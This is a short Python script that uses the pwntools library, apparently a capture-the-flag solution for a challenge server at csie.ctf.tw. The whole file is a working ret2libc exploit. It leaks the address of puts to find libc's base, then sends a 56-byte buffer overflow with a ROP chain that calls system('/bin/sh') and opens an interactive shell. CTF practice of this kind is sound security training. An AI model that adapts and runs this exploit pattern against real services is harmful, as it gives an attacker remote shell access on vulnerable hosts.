#!/usr/bin/env python

from pwn import *

r = remote('csie.ctf.tw', 10127)

puts_got = '0x601018'
pop_rdi = 0x0000000000400823

libc = ELF('./libc.so.6')

r.recvuntil(':')
r.sendline(puts_got)
r.recvuntil(':')
puts_addr = int(r.recvline()[:-1], 16)
base = puts_addr - libc.symbols['puts']
system = base + libc.symbols['system']
r.recvuntil('?')
shell = base + next(libc.search('/bin/sh\x00'))
r.sendline('a' * 56 + p64(pop_rdi) + p64(shell) + p64(system))
r.interactive()
